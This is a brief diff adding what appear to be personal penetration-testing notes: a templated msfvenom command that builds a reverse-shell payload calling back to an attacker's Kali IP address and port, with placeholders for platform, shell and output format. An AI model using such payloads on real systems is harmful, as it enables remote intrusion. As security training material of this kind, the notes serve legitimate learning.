@@ -1,0 +1,4 @@
+Lets create payload using MSF venom 
+
+# msfvenom -p <Linux/Windows>/<Select the suitable shell> LHOST=<Kali IP address> LPORT=<Kali Port> -f <what formayt the payload should be> > output-file.format
+
